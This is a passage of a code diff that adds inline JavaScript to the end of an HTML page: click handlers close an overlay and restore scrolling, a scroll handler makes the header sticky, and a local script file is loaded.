+        // CLOSE on ❌ click
+        closeBtn.addEventListener("click", () => {
+            overlay.classList.add("hidden");
+            document.body.classList.remove("no-scroll");
+        });
+        body.addEventListener("click", () => {
+            overlay.classList.add("hidden");
+            document.body.classList.remove("no-scroll");
+        });
+    });
+
+    window.addEventListener('scroll', function(){
+        const header = document.querySelector('header');
+        header.classList.toggle("sticky", window.scrollY > 0);
+    });
+</script>
+<script src="js/script.js"></script>
 </body>
-
 </html>
